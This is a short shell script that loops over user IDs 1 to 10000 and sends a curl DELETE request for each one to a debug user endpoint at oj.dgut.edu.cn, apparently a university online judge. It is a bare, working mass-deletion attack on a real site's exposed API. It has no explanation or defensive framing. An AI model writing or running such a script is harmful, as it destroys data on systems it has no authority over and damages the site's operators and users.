#!/bin/sh
for ((i=1; i<=10000; i++))
do
  curl 'https://oj.dgut.edu.cn/api/user_debug/'$i'/' -X DELETE
done
